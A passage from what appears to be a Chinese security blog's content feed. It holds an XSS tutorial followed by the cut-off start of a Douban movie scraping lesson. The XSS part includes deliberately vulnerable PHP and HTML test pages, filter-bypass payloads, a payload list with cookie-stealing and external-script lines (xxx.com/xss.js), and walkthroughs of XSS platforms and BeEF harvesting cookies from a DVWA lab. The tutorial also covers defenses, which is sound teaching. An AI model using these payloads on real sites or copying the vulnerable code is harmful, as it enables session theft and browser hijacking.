class="subst">$_POST</span>[comment]&#x27;)&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>)) &#123;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;select * from comment ;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;：&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;comment&quot;</span>].<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这是一个简单的评论界面，用户提交数据后保存至数据库，再由数据库中调出数据并显示再下方。显然对写入数据库的数据没有进行过滤，存在XSS。存储型XSS的数据流向是：前端–&gt;后端–&gt;数据库–&gt;后端–&gt;前端。<img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317212829283.png" alt="image-20210317212829283"></p><p>在输入框（可注入位置）中插入<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>，然后提交。此xss代码会写入数据库，后面再访问这个页面都会执行插入的XSS代码，出现弹窗。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317213645942.png" alt="image-20210317213645942"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317213733557.png" alt="image-20210317213733557"></p><p>查看网页源代码可以发现，从数据库调出来的数据被浏览器执行了。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317214235176.png" alt="image-20210317214235176"></p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>也被称作本地跨站，是基于文档对象模型Document Object Model（DOM）的一种漏洞。DOM是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分。DOM中有很多对象，其中一些对象可以被用户所操纵，如url，location等。客户端的脚本程序可以通过DOM来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得DOM中的数据后并在本地执行，因此仅从服务器端是没有办法防御DOM型XSS漏洞的，如若DOM中的数据没有经过严格的验证，便会产生基于DOM的XSS漏洞。基于DOM的XSS是反射的特例，其中JavaScript隐藏在URL中，并在其呈现时由页面中的JavaScript取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的WAF或其他防护检测不出恶意内容。</p><blockquote><p>可能触发DOM型XSS的属性</p><p>document.referer、window.name、location、innerHTML、documen.write</p></blockquote><p>测试代码<code>dom.php</code>,参考于<a href="https://github.com/zhuifengshaonianhanlu/pikachu">Pikachu</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;DOM型XSS测试&lt;/h2&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> str = document.getElementById(<span class="string">&quot;text&quot;</span>).value;</span><br><span class="line">            document.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">            console.log(document.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML);</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;click me!&quot;</span> onclick=<span class="string">&quot;domxss()&quot;</span>&gt;</span><br><span class="line">    &lt;div id=<span class="string">&quot;dom&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>它通过 getElementById 获取到了标签 Id 为 text的内容赋值给str，然后又把 str 的内容通过字符串拼接的方式写到了 a 标签的 href 属性中，a标签会写到 Id 为 dom的 div 标签中，我们通过闭合的方式构造Payload<code>#&#39;onclick=&quot;alert(document.cookie)&quot;</code>。DOM型XSS漏洞数据流向是： 前端–&gt;浏览器。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210316010752417.png" alt="image-20210316010752417"></p><h1 id="XSS漏洞测试流程"><a href="#XSS漏洞测试流程" class="headerlink" title="XSS漏洞测试流程"></a>XSS漏洞测试流程</h1><p><strong>黑盒测试</strong></p><ol><li>在目标站点上找到输入点，比如搜索栏，错误页面，留言板等。</li><li>输入一组”特殊字符（如<code>&gt;</code>,<code>&quot;</code>,<code>&#39;</code>等）+唯一识别字符”，点击提交后，查看返回源码，是否做对应的处理。</li><li>通过搜索定位到唯一识别字符，结合唯一识别字符前后语法确认是否可以构造执行js的条件(构造闭合)。</li><li>提交构造的脚本代码以及各种绕过姿势，看是否可以成功执行，如果成功执行则说明该站点存在XSS漏洞。</li></ol><p><strong>Tips：</strong></p><ol><li>通常搜索栏容易出现反射型XSS，留言板容易出现存储型XSS；</li><li>有些网站鉴于后台可能存在过滤措施，组建的script可能会被过滤掉，因而无法生效或者环境限制脚本执行；</li><li>通过变化不同的script，尝试绕过后台的过滤机制。</li></ol><p><strong>白盒测试(代码审计)</strong></p><p>关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。</p><p>PHP中常见的接收参数的方式有<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>等等，可以搜索所有接收参数的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。</p><p>也可以搜索类似echo这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。</p><p>大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等。</p><p>同理审计DOM型注入可以搜索一些js操作DOM元素的关键词进行审计。</p><h1 id="XSS-payload"><a href="#XSS-payload" class="headerlink" title="XSS-payload"></a>XSS-payload</h1><p>更多可见：[<a href="https://www.cnblogs.com/-mo-/p/11229183.html">WEB安全]XSS命令总结 作者：肖洋肖恩、</a> </p><ol><li><p>若使用一些函数将构成xss代码的一些关键字符给过滤了，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name&#x3D;preg_replace(&quot;&#x2F;&lt;script&gt;&#x2F;&quot;,&quot;&quot;,$name);      &#x2F;&#x2F;过滤&lt;script&gt;</span><br><span class="line">$name&#x3D;preg_replace(&quot;&#x2F;&lt;\&#x2F;script&gt;&#x2F;&quot;,&quot;&quot;,$name);   &#x2F;&#x2F;过滤&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>绕过技巧：可以使用大小写绕过  <code>&lt;scripT&gt;alert(&#39;hack&#39;)&lt;/scripT&gt;</code></p></li><li><p>若不区分大小写过滤标签，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name&#x3D;preg_replace(&quot;&#x2F;&lt;script&gt;&#x2F;i&quot;,&quot;&quot;,$name);    &#x2F;&#x2F;不区分大小写过滤 &lt;script&gt;</span><br><span class="line">$name&#x3D;preg_replace(&quot;&#x2F;&lt;\&#x2F;script&gt;&#x2F;i&quot;,&quot;&quot;,$name);  &#x2F;&#x2F;不区分大小写过滤 &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>绕过技巧：可以使用嵌套的script标签绕过  <code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;hack&#39;)&lt;/scr&lt;/script&gt;ipt&gt;</code></p></li><li><p>若不区分大小写，过滤之间的所有内容，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); &#x2F;&#x2F;过滤了&lt;script  及其之间的所有内容</span><br></pre></td></tr></table></figure><p>虽然无法使用<code>&lt;script&gt;</code>标签注入XSS代码，但是可以通过img、body等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码。如payload： <code>&lt;img src=1 οnerrοr=alert(&#39;hack&#39;)&gt;</code></p></li></ol><p>一些常用payload：</p><ul><li><code>&lt;script&gt;标签</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;hack&quot;)&lt;&#x2F;script&gt;   #弹出hack</span><br><span class="line">&quot;&gt; &lt;script&gt;alert(1)&lt;&#x2F;script&gt;  #正常截断</span><br><span class="line">&lt;script&gt;alert(\&#39;hack\&#39;)&lt;&#x2F;script&gt;  #数据提交至数据库时有时引号需要转义 </span><br><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;        #弹出1，对于数字可以不用引号</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;      #弹出cookie</span><br><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;xxx.com&#x2F;xss.js&gt;&lt;&#x2F;script&gt;  #引用外部的xss</span><br></pre></td></tr></table></figure><ul><li><code>&lt;img&gt;标签</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img  src&#x3D;1  οnerrοr&#x3D;alert(&quot;hack&quot;)&gt;</span><br><span class="line">&lt;img  src&#x3D;1  οnerrοr&#x3D;alert(document.cookie)&gt; </span><br><span class="line">&lt;img  src&#x3D;&quot;javascript:alert(&quot;XSS&quot;);&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;body&gt;标签</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body οnlοad&#x3D;alert(1)&gt;</span><br><span class="line">&lt;body οnpageshοw&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><ul><li><code>video标签</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video οnlοadstart&#x3D;alert(1) src&#x3D;&quot;&#x2F;media&#x2F;hack-the-planet.mp4&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><ul><li><code>style标签</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style οnlοad&#x3D;alert(1)&gt;&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><ul><li><code>监听键盘onkeydown事件</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.onkeydown&#x3D;funciont(e)&#123;</span><br><span class="line">if(!e)e&#x3D;window.event;</span><br><span class="line">try(hijack();)catch(ex)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>捕获用户输入的特定键</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function keyDown()&#123;</span><br><span class="line">var keycode &#x3D; event.keyCode;</span><br><span class="line">var realkey &#x3D; String.fromCharCode(event.keyCode);</span><br><span class="line">alert(&quot;按键码: &quot; + keycode + &quot; 字符: &quot; + realkey);</span><br><span class="line">&#125;</span><br><span class="line">document.onkeydown &#x3D; keyDown;</span><br><span class="line">&lt;&#x2F;scrip&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;&gt;被过滤时</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert&#96;1&#96; </span><br><span class="line">“ autofocus onfocus&#x3D;alert(1)</span><br><span class="line">javascript:alert(111) #输入在 a 标签的 href属性中</span><br></pre></td></tr></table></figure><h1 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a>XSS平台</h1><p>如果我们的JS水平一般的话（真实），我们可以利用网上免费的XSS平台来构造代码实施攻击。</p><p><a href="https://xss.pt/">经典的XSS平台</a>（也可以下载安装<a href="https://github.com/trysec/BlueLotus_XSSReceiver">清华蓝莲花战队开发的XSS平台</a> ）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317214802204.png" alt="image-20210317214802204"></p><p>在我的项目中创建新项目，选择最基本的默认模块，勾选keepsession，可以完成获取cookie等操作。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317215103530.png" alt="image-20210317215103530"></p><p>在出现xss的地方可以插入以下给出的代码，完成攻击。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317215400602.png" alt="image-20210317215400602"></p><p>在DVWA的XSS中进行测试，插入其中一条攻击代码。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317222324244.png" alt="image-20210317222324244"></p><p>回到xss平台，已经返回了cookie等信息。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317222507374.png" alt="image-20210317222507374"></p><h1 id="BeEF"><a href="#BeEF" class="headerlink" title="BeEF"></a>BeEF</h1><p>BeeF是web框架攻击平台，kali 集成Beef，而且Beef有很多好使的payload。例如，通过XSS这个简单的漏洞，BeeF可以通过一段编制好的javascript控制目标主机的浏览器，通过浏览器拿到各种信息并且扫描内网信息，同时能够配合metasploit进一步渗透主机，强大的有些吓人。</p><p>首先在kali打开BeEF，在左侧栏中点击beef图标会先弹出一个命令行窗口，然后会打开对应网页，命令行窗口显示了一些配置。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210318000642015.png" alt="image-20210318000642015"></p><p>利用命令行给出的方法，将脚本代码插入到存在XSS的地方。这里选择插入到DVWA中存储型XSS漏洞的页面。这里的kali就相当于一台服务器。原理与XSS平台类似，就是将受害者的信息发送到kali的beef中。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210318002439090.png" alt="image-20210318002439090"></p><p>此时BeEF的网页中已经显示自己中招。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210318002610341.png" alt="image-20210318002610341"></p><h1 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210108153631445.png"></p><ul><li><strong>钓鱼欺骗</strong>：最典型的即是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术对目标网站发起更高级的钓鱼攻击。</li><li><strong>网站挂马</strong>：跨站攻击时，攻击者利用Iframe标签嵌入隐藏的恶意网站，将被攻击者定向到恶意网站上或以弹出恶意网站窗口等的方式，进行挂马。</li><li><strong>身份盗用</strong>：Cookie是用户对于特定网站的身份验证的标志，XSS攻击可以令攻击者盗取用户的cookie，从而利用该cookie盗取用户对该网站的操作权限</li><li><strong>垃圾信息发送</strong>：在社交网站社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</li><li><strong>劫持用户Web行为</strong>：一些高级的XSS攻击甚至可以劫持用户的Web行为，从而监视用户的浏览历史、发送与接收的数据等。</li><li><strong>XSS蠕虫病毒</strong>：借助XSS蠕虫病毒还可以用来打广告、刷流量、挂马、恶作剧、破坏数据、对目标实施DDoS攻击等。</li></ul><p>存储型的XSS危害最大。因为他存储在服务器端，所以不需要我们和被攻击者有任何接触，只要被攻击者访问了该页面就会遭受攻击。而反射型和DOM型的XSS则需要我们去诱使用户点击我们构造的恶意的URL，需要我们和用户有直接或者间接的接触，比如利用社会工程学或者利用在其他网页挂马的方式。</p><h1 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h1><p>通过对上面内容进行学习，容易知道主要是前端页面完全信任了用户输入的数据导致了XSS漏洞出现，所以我们可以在前端加上过滤代码、转义代码，对用户的输入(和URL参数)进行过滤，输出进行转义。对输入的内容进行过滤，可以分为黑名单过滤和白名单过滤。黑名单：过滤特殊符号及字符，可以拦截大部分的XSS攻击，但是还是存在被绕过的风险。白名单：只允许特定类型或字符，可以基本杜绝XSS攻击，但是真实环境中一般是不能进行如此严格的白名单过滤的。</p><p>其次，假如攻击者有一定几率绕过前端防御，可以将cookie 标记为 http only，这样的话当浏览器向服务端发起请求时就会带上 cookie 字段，但是在脚本中却不能访问 cookie，这样就避免了 XSS 攻击利用 js 的 <code>document.cookie</code>获取 cookie。</p><ul><li>通过一些函数对动态输出到页面的内容进行html编码，使其不能作为脚本运行。如</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#使用htmlspecialchars函数对用户输入的name参数进行html编码，将其转换为html实体</span><br><span class="line">$name &#x3D; htmlspecialchars( $_GET[ &#39;name&#39; ] );</span><br></pre></td></tr></table></figure><ul><li>使用XSS Filter</li></ul><p>针对用户提交的数据进行有效的验证，只接受我们规定的长度或内容的提交，过滤掉其他的输入内容。比如：</p><ol><li>表单数据指定值的类型：年龄只能是 int 、名字只能是字母数字等。</li><li>过滤或移除特殊的 html 标签：<code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code>等。</li><li>过滤 js 事件的标签：<code>onclick</code>、<code>onerror</code>、<code>onfocus</code>等。</li></ol><ul><li>确保执行脚本来源可信</li></ul><p>开发者明确告诉客户端，哪些外部资源可以加载和执行（CSP策略）</p><p>总之，总的原则：<strong>输入做过滤，输出做转义</strong></p><ul><li>过滤：根据业务需求进行过滤，比如输入点要求输入手机号，则只允许输入手机号格式的数字。</li><li>转义：所有输出到前端的数据根据输出点进行转义，比如输出到html中进行html实体转义，输入到JS里面进行JS转义。</li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://blog.csdn.net/qq_35393693/article/details/86597707">XSS(跨站脚本)漏洞详解之XSS跨站脚本攻击漏洞的解决</a></p><p>[2] <a href="https://mp.weixin.qq.com/s?__biz=MzAwNTAxMjUwNw==&mid=2650265496&idx=1&sn=964f788970cb95a8f78dbdc432cff562&chksm=83205aecb457d3faf7f1f9ea017ae0be6139ecd01c03a4d6f097499f0ea0e934cbac2d28eadf&scene=132#wechat_redirect">兵临城下丨记一次XSS靶场通关实践</a></p><p>[3] <a href="https://my.oschina.net/u/4593189/blog/4418296">一篇文章带你从XSS入门到进阶(附Fuzzing+BypassWAF+Payloads)</a></p><p>[4] <a href="https://blog.csdn.net/whoim_i/article/details/102877616">kali之beef的使用</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫第一课</title>
      <link href="posts/12051.html"/>
      <url>posts/12051.html</url>
      
        <content type="html"><![CDATA[<h1 id="爬虫初识"><a href="#爬虫初识" class="headerlink" title="爬虫初识"></a>爬虫初识</h1><ul><li>什么是爬虫<br>网络爬虫，是一种按照一定规则，自动抓取互联网信息的程序或者脚本。由于互联网数据的多样性和资源的有限性，根据用户需求定向抓取相关网页并分析已成为如今主流的爬取策略。</li><li>爬虫可以做什么<br>你可以爬取妹子的图片，爬取自己想看的视频等等，只要你能通过浏览器访问的数据都可以通过爬虫获取。</li><li>爬虫的本质是什么<br>模拟浏览器打开网页，获取网页中我们想要的那部分数据。</li></ul><h1 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h1><ol><li>准备工作<br>通过浏览器查看分析目标网页。</li><li>获取数据<br>通过requests库向目标站点发起请求，请求可以包含额外的header等信息，如果服务器能正常响应，会得到一个Response，便是所要获取的页面内容。</li><li>解析内容<br>得到的内容可能是HTML、json等格式，可以用页面解析库、正则表达式等进行解析。</li><li>保存数据<br>保存形式多样，可以存为文本，也可以保存到数据库，或者保存特定格式的文件。</li></ol><h1 id="爬虫第一课"><a href="#爬虫第一课" class="headerlink" title="爬虫第一课"></a>爬虫第一课</h1><blockquote><p>这里使用requests模块和BeautifulSoup模块</p><p>爬取内容为：豆瓣top250电影的名字、简介、评分及评分人数。</p></blockquote><h2 id="查找信息"><a href="#查找信息" class="headerlink" title="查找信息"></a>查找信息</h2><p>进入<a href="https://movie.douban.com/top250?start=0">豆瓣电影Top250</a>，F12审查元素，找到所要爬取的信息都在标签 <code>&lt;div class=&quot;info&quot;&gt;</code> 中间，如下图所示。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/4fbThzNRHkCJm2t.png" alt="image-20210314143734029"></p><p><strong>URL：</strong></p><p><a href="https://movie.douban.com/top250?start=0">https://movie.douban.com/top250?start=0</a></p><p>后面分别为：strat=25，50…分别对应前25部、26 ~ 50部、51 ~ 75部…电影的信息。</p><p><strong>User-Agent:</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210314145348886.png" alt="image-20210314145348886"></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_movies</span>():</span></span><br><span class="line">    <span class="comment"># 添加header</span></span><br><span class="line">    headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">    <span class="comment"># 创建存储信息的列表</span></span><br><span class="line">    movie_title=[]</span><br><span class="line">    movie_other=[]</span><br><span class="line">    movie_info=[]</span><br><span class="line">    movie_fen=[]</span><br><span class="line">    movie_num=[]</span><br><span class="line">    <span class="comment"># 遍历每个页面链接并发出GET请求</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">        link=<span class="string">&#x27;https://movie.douban.com/top250?start=&#x27;</span>+<span class="built_in">str</span>(i*<span class="number">25</span>)</span><br><span class="line">        r=requests.get(link,headers=headers)</span><br><span class="line">        print(<span class="string">&#x27;已获取第&#x27;</span>,<span class="built_in">str</span>(i*<span class="number">25</span>+<span class="number">1</span>),<span class="string">&#x27;到&#x27;</span>,<span class="built_in">str</span>(i*<span class="number">25</span>+<span class="number">25</span>),<span class="string">&#x27;部电影信息。&#x27;</span>)</span><br><span class="line">        <span class="comment"># 获取电影信息</span></span><br><span class="line">        soup=BeautifulSoup(r.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;hd&#x27;</span>):</span><br><span class="line">            name = t.find(<span class="string">&#x27;span&#x27;</span>, <span class="string">&#x27;title&#x27;</span>).get_text()</span><br><span class="line">            movie_title.append(name)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;hd&#x27;</span>):</span><br><span class="line">            name = t.find(<span class="string">&#x27;span&#x27;</span>, <span class="string">&#x27;other&#x27;</span>).get_text()</span><br><span class="line">            movie_other.append(name)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;info&#x27;</span>):</span><br><span class="line">            info = t.find(<span class="string">&#x27;p&#x27;</span>).get_text().replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            movie_info.append(info)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;star&#x27;</span>):</span><br><span class="line">            fen = t.find(<span class="string">&#x27;span&#x27;</span>, <span class="string">&#x27;rating_num&#x27;</span>).get_text()</span><br><span class="line">            movie_fen.append(fen)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>,<span class="string">&#x27;star&#x27;</span>):</span><br><span class="line">            num = t.find_all(<span class="string">&#x27;span&#x27;</span>)[<span class="number">3</span>].get_text()</span><br><span class="line">            movie_num.append(num)</span><br><span class="line">    <span class="keyword">return</span> movie_title,movie_other,movie_info,movie_fen,movie_num</span><br><span class="line"></span><br><span class="line">a,b,c,d,e=get_movies()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">import</span> codecs</span><br><span class="line">    <span class="comment"># 将获取信息写入TXT文件</span></span><br><span class="line">    <span class="keyword">with</span> codecs.<span class="built_in">open</span>(<span class="string">&#x27;c:\\Users\\32662\\Desktop\\douban.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">&#x27;豆瓣电影 Top 250\n\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">250</span>):</span><br><span class="line">                f.write(<span class="string">&#x27;Top&#x27;</span>+<span class="built_in">str</span>(n+<span class="number">1</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                f.write(<span class="string">&#x27;电影名：&#x27;</span>+a[n]+b[n]+c[n]+<span class="string">&#x27;豆瓣评分&#x27;</span>+d[n]+<span class="string">&#x27; &#x27;</span>+e[n])</span><br><span class="line">                f.write(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span 